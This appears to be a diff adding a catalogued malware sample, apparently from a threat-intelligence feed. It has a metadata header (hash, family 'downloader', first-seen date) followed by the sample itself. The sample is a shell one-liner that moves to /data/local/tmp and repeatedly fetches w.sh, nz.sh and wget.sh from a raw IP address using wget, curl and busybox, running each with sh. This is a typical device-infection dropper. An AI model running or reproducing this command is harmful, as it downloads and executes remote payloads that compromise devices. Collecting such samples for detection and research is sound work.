@@ -1,0 +1,10 @@
+# sha256: dc995b0507a0a5f9fe45fac39f1be84db50836a10e7dd739d1cd932f11b1c77e
+# family: downloader
+# kind: script
+# size_bytes: 321
+# first_seen: 2026-07-22 15:08:54.367951 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /data/local/tmp/; busybox wget http://41.216.189.236/w.sh; sh w.sh; curl http://41.216.189.236/nz.sh; sh nz.sh; wget http://41.216.189.236/wget.sh; sh wget.sh; curl http://41.216.189.236/wget.sh; sh wget.sh; busybox wget http://41.216.189.236/wget.sh; sh wget.sh; busybox curl http://41.216.189.236/wget.sh; sh wget.sh
